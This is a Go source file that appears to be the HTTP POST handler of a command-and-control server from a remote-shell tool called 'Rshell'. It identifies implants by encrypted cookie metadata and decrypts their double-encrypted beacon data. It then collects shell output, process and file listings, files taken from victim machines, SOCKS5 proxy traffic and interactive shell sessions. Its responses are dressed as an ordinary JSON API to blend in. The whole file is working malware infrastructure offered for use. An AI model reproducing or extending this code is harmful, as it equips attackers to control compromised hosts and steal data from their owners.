package communication

import (
	"Rshell/pkg/command"
	"Rshell/pkg/protocol"
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/interactive"
	"Rshell/pkg/logger"
	"Rshell/pkg/utils"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

func PostHttp(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("HTTP POST handler panic recovered:", r)
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]string{
				"error": "Internal server error",
			})
		}
	}()

	// 设置响应头
	w.Header().Set("Content-Type", "application/json")

	// 获取Cookie
	cookieValue := r.Header.Get("Cookie")
	if cookieValue == "" {
		logger.Warn("No cookie in POST request")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Cookie required",
		})
		return
	}

	// 解析元数据
	encryptMetainfo := strings.TrimPrefix(cookieValue, config.Http_get_metadata_prepend)
	if encryptMetainfo == cookieValue {
		logger.Warn("Invalid cookie format in POST request")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Invalid cookie format",
		})
		return
	}

	// 验证元数据长度
	if len(encryptMetainfo) == 0 {
		logger.Warn("Empty metadata in POST request")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Empty metadata",
		})
		return
	}

	// 解码元数据
	tmpMetainfo, err := encrypt.DecodeBase64([]byte(encryptMetainfo))
	if err != nil {
		logger.Error("DecodeBase64 failed:", err)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Invalid metadata format",
		})
		return
	}

	metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
	if err != nil {
		logger.Error("Decrypt failed:", err)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Invalid metadata encryption",
		})
		return
	}

	// 验证metainfo长度
	if len(metainfo) < 9 {
		logger.Error("Metainfo too short:", len(metainfo))
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Invalid metadata length",
		})
		return
	}

	uid := encrypt.BytesToMD5(metainfo)

	// 验证UID
	if len(uid) == 0 {
		logger.Error("Invalid UID generated")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Internal server error",
		})
		return
	}

	// 读取请求体
	dataValue, err := io.ReadAll(r.Body)
	if err != nil {
		logger.Error("Failed to read request body:", err)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Failed to read request body",
		})
		return
	}

	// 验证请求体长度
	if len(dataValue) == 0 {
		logger.Warn("Empty request body")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Empty request body",
		})
		return
	}

	// 解码Base64
	dataBytes, err := encrypt.DecodeBase64([]byte(dataValue))
	if err != nil {
		logger.Error("DecodeBase64 failed for data:", err)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Invalid data format",
		})
		return
	}

	// 第一次解密
	dataBytes, err = encrypt.Decrypt(dataBytes, uid)
	if err != nil {
		logger.Error("First decrypt failed:", err)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Data decryption failed",
		})
		return
	}

	// 第二次解密
	dataBytes, err = encrypt.Decrypt(dataBytes, uid)
	if err != nil {
		logger.Error("Second decrypt failed:", err)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Data decryption failed",
		})
		return
	}

	// 验证解密后数据长度
	if len(dataBytes) < 4 {
		logger.Error("Decrypted data too short:", len(dataBytes))
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Invalid data length",
		})
		return
	}

	// 解析回复类型
	replyTypeBytes := dataBytes[:4]
	data := dataBytes[4:]
	replyType := binary.BigEndian.Uint32(replyTypeBytes)

	// 处理不同的回复类型
	switch replyType {
	case 0: // 命令行展示
		var shell database.Shell
		if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
			// 限制数据长度，防止过大的日志
			var content string
			if len(data) > 10000 {
				content = string(data[:10000]) + "\n[Data truncated...]"
			} else {
				content = string(data) + "\n"
			}

			shell.ShellContent += content
			if _, err := database.Engine.Where("uid = ?", uid).Update(&shell); err != nil {
				logger.Error("Failed to update shell:", err)
			}
		}

	case 31: // 错误展示
		var shell database.Shell
		if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
			// 限制数据长度，防止过大的日志
			var content string
			if len(data) > 10000 {
				content = string(data[:10000]) + "\n[Data truncated...]"
			} else {
				content = string(data)
			}

			shell.ShellContent += "!Error: " + content + "\n"
			if _, err := database.Engine.Where("uid = ?", uid).Update(&shell); err != nil {
				logger.Error("Failed to update shell:", err)
			}
		}

	case command.PS:
		if len(data) > 0 {
			command.VarPidQueue.Add(uid, string(data))
		}

	case command.FileBrowse:
		if len(data) > 0 {
			command.VarFileBrowserQueue.Add(uid, string(data))
		}

	case 22: // 文件下载第一条信息
		if len(data) < 8 { // 至少4字节长度+部分路径
			logger.Error("File download info too short:", len(data))
			break
		}

		fileLen := int(binary.BigEndian.Uint32(data[:4]))
		if len(data) < 5 { // 至少4字节长度+1字节路径
			logger.Error("No file path in download info")
			break
		}

		filePath := string(data[4:])
		if filePath == "" {
			logger.Error("Empty file path")
			break
		}

		// 验证文件长度合理性
		if fileLen <= 0 {
			logger.Error("Invalid file length:", fileLen)
			break
		}

		// 使用安全路径函数
		fullPath, err := utils.GetSafeFilePath(uid, filePath)
		if err != nil {
			logger.Error("Security check failed:", err)
			break
		}

		// 更新数据库
		sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
		_, err = database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
		if err != nil {
			logger.Error("Database update failed:", err)
		}

		// 确保下载目录存在
		downloadDir := filepath.Dir(fullPath)
		if err := os.MkdirAll(downloadDir, 0755); err != nil {
			logger.Error("Failed to create download directory:", err)
			break
		}

		// 检查文件是否存在，如果存在则删除
		if _, err := os.Stat(fullPath); err == nil {
			if err := os.Remove(fullPath); err != nil {
				logger.Error("Failed to remove existing file:", err)
				break
			}
		}

		// 创建新文件（使用安全路径）
		fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
		if err != nil {
			logger.Error("Failed to create file:", err)
			break
		}
		fp.Close()

	case command.DOWNLOAD: // 文件下载
		if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
			logger.Error("Download data too short:", len(data))
			break
		}

		filePathLen := int(binary.BigEndian.Uint32(data[:4]))
		if len(data) < 4+filePathLen {
			logger.Error("Invalid file path length in download:", filePathLen, "available:", len(data)-4)
			break
		}

		if filePathLen == 0 {
			logger.Error("Zero file path length")
			break
		}

		filePath := string(data[4 : 4+filePathLen])
		fileContent := data[4+filePathLen:]

		// 使用通用的安全路径函数
		fullPath, err := utils.GetSafeFilePath(uid, filePath)
		if err != nil {
			logger.Error("Security check failed:", err)
			break
		}

		// 使用事务更新数据库
		utils.Filelock.Lock()
		// 使用事务更新数据库
		var fileDownloads database.Downloads
		if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
			fileDownloads.DownloadedSize += len(fileContent)
			database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)
		}
		utils.Filelock.Unlock()

		// 确保下载目录存在
		downloadDir := filepath.Dir(fullPath)
		if err := os.MkdirAll(downloadDir, 0755); err != nil {
			logger.Error("Failed to create download directory:", err)
			break
		}

		// 使用安全路径打开文件
		fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			logger.Error("Failed to open file:", err)
			break
		}
		defer fp.Close()

		if _, err := fp.Write(fileContent); err != nil {
			logger.Error("Failed to write file content:", err)
		}

	case command.DRIVES:
		if len(data) > 0 {
			drives := utils.GetExistingDrives(data)
			command.VarDrivesQueue.Add(uid, drives)
		}

	case command.FileContent:
		if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
			logger.Error("File content data too short:", len(data))
			break
		}

		filePathLen := int(binary.BigEndian.Uint32(data[:4]))
		if len(data) < 4+filePathLen {
			logger.Error("Invalid file path length in file content:", filePathLen, "available:", len(data)-4)
			break
		}

		if filePathLen == 0 {
			logger.Error("Zero file path length")
			break
		}

		filePath := string(data[4 : 4+filePathLen])
		fileContent := data[4+filePathLen:]
		command.VarFileContentQueue.Add(uid, filePath, string(fileContent))

	case command.Socks5Data:
		if len(data) < 16 {
			logger.Error("Socks5 data too short:", len(data))
			break
		}

		md5sign := data[:16]
		rawData := data[16:]
		command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
	case command.WriteInteractieShell:
		sessionIDLen := int(binary.BigEndian.Uint32(data[:4]))

		sessionID := string(data[4 : 4+sessionIDLen])
		output := data[4+sessionIDLen:]

		interactive.SendOutputToSession(uid, sessionID, output)
	default:
		logger.Warn("Unknown reply type:", replyType)
	}

	// 生成响应
	var pos1, pos2, pos3 []byte
	var err1, err2 error

	pos1, err1 = encrypt.EncodeBase64(encrypt.GenRandomBytes())
	pos2, err2 = encrypt.EncodeBase64(encrypt.GenRandomBytes())
	pos3 = []byte{}

	if err1 != nil || err2 != nil {
		logger.Error("Failed to generate random bytes for response:", err1, err2)
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Internal server error",
		})
		return
	}

	response := map[string]interface{}{
		"data": map[string]interface{}{
			"log_id": encrypt.GenRandomLogID(),
			"action_rule": map[string][]byte{
				"pos_1": pos1,
				"pos_2": pos2,
				"pos_3": pos3,
			},
		},
	}

	// 设置 Content-Type 为 JSON
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)

	// 编码 JSON 并写入响应
	if err := json.NewEncoder(w).Encode(response); err != nil {
		logger.Error("Failed to encode response:", err)
	}
}
